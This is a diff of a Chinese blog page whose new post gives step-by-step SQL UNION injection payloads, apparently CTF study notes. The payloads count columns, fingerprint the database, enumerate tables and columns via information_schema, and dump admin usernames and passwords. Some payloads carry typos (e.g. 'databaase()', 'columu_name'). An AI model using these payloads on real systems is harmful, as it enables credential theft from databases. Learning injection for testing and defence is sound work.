@@ -4,17 +4,17 @@
   <meta charset="utf-8">
   
   
-  <title>娜姐今晚刀谁？ | hiyajojo</title>
+  <title>联合注入具体的过程和步骤 | hiyajojo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="This is MyBlog Notes">
+  <meta name="description" content="重要前提：union联合注入只适用于有返回结果的sql语句注入判断有几列1.id&#x3D;2 order by num 判断是字符注入还是数值注入2.id&#x3D;2’ id&#x3D;1 union select 1,2,3,4,5 id&#x3D;1 union select 1,2,database(),version(),user() 输出对应的表名id&#x3D;-1 union select 1,2,table_name,4,5">
 <meta property="og:type" content="article">
-<meta property="og:title" content="娜姐今晚刀谁？">
-<meta property="og:url" content="http://example.com/2021/01/26/%E5%A8%9C%E5%A7%90%E4%BB%8A%E6%99%9A%E5%88%80%E8%B0%81/index.html">
+<meta property="og:title" content="联合注入具体的过程和步骤">
+<meta property="og:url" content="http://example.com/2021/03/01/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%85%B7%E4%BD%93%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%AD%A5%E9%AA%A4/index.html">
 <meta property="og:site_name" content="hiyajojo">
-<meta property="og:description" content="This is MyBlog Notes">
+<meta property="og:description" content="重要前提：union联合注入只适用于有返回结果的sql语句注入判断有几列1.id&#x3D;2 order by num 判断是字符注入还是数值注入2.id&#x3D;2’ id&#x3D;1 union select 1,2,3,4,5 id&#x3D;1 union select 1,2,database(),version(),user() 输出对应的表名id&#x3D;-1 union select 1,2,table_name,4,5">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-01-25T19:46:00.000Z">
-<meta property="article:modified_time" content="2021-01-25T11:47:09.731Z">
+<meta property="article:published_time" content="2021-03-01T13:39:11.000Z">
+<meta property="article:modified_time" content="2021-03-11T05:43:07.838Z">
 <meta property="article:author" content="hiyajojo">
 <meta name="twitter:card" content="summary">
   
@@ -77,10 +77,10 @@
 </header>
 
       <div class="outer">
-        <section id="main"><article id="post-娜姐今晚刀谁" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-联合注入具体的过程和步骤" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2021/01/26/%E5%A8%9C%E5%A7%90%E4%BB%8A%E6%99%9A%E5%88%80%E8%B0%81/" class="article-date">
-  <time class="dt-published" datetime="2021-01-25T19:46:00.000Z" itemprop="datePublished">2021-01-25</time>
+    <a href="/2021/03/01/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%85%B7%E4%BD%93%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%AD%A5%E9%AA%A4/" class="article-date">
+  <time class="dt-published" datetime="2021-03-01T13:39:11.000Z" itemprop="datePublished">2021-03-01</time>
 </a>
     
   </div>
@@ -91,7 +91,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      娜姐今晚刀谁？
+      联合注入具体的过程和步骤
     </h1>
   
 
@@ -99,11 +99,21 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        
+        <h5 id="重要前提：union联合注入只适用于有返回结果的sql语句注入"><a href="#重要前提：union联合注入只适用于有返回结果的sql语句注入" class="headerlink" title="重要前提：union联合注入只适用于有返回结果的sql语句注入"></a>重要前提：union联合注入只适用于有返回结果的sql语句注入</h5><h5 id="判断有几列"><a href="#判断有几列" class="headerlink" title="判断有几列"></a>判断有几列</h5><p>1.id=2 order by num</p>
+<h5 id="判断是字符注入还是数值注入"><a href="#判断是字符注入还是数值注入" class="headerlink" title="判断是字符注入还是数值注入"></a>判断是字符注入还是数值注入</h5><p>2.id=2’</p>
+<p>id=1 union select 1,2,3,4,5</p>
+<p>id=1 union select 1,2,database(),version(),user()</p>
+<h5 id="输出对应的表名"><a href="#输出对应的表名" class="headerlink" title="输出对应的表名"></a>输出对应的表名</h5><p>id=-1 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=databaase()</p>
+<h5 id="如果想要把所有表名输出"><a href="#如果想要把所有表名输出" class="headerlink" title="如果想要把所有表名输出"></a>如果想要把所有表名输出</h5><p>id=1 union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema=databaase()</p>
+<h5 id="有表后查对应的列名"><a href="#有表后查对应的列名" class="headerlink" title="有表后查对应的列名"></a>有表后查对应的列名</h5><p>id=1 union select 1,2,group_concat(columu_name),4,5 from information_schema.columus where table_name=’admin’</p>
+<h5 id="查询最后的具体flag"><a href="#查询最后的具体flag" class="headerlink" title="查询最后的具体flag"></a>查询最后的具体flag</h5><p>id=1 union select 1,2,3,4,(password) from admin</p>
+<p>id=1 union select 1,2,3,4,concat(username,0x5c,password) from admin</p>
+<h5 id="查询其他的记录"><a href="#查询其他的记录" class="headerlink" title="查询其他的记录"></a>查询其他的记录</h5><p>id=1 union select 1,2,3,4,concat(username,0x5c,password) from admin limit 1,1</p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/26/%E5%A8%9C%E5%A7%90%E4%BB%8A%E6%99%9A%E5%88%80%E8%B0%81/" data-id="ckm4gx2q00006v0uf397z7775" data-title="娜姐今晚刀谁？" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2021/03/01/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%85%B7%E4%BD%93%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%AD%A5%E9%AA%A4/" data-id="ckm4gx2q3000bv0ufb5jjd7sw" data-title="联合注入具体的过程和步骤" class="article-share-link">分享</a>
       
       
       
@@ -113,15 +123,20 @@
     
 <nav id="article-nav">
   
-    <a href="/2021/02/21/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2021/03/05/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">前一篇</strong>
       <div class="article-nav-title">
         
-          信息收集
+          布尔盲注
         
       </div>
     </a>
   
+  
+    <a href="/2021/02/26/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">联合注入</div>
+    </a>
   
 </nav>
 
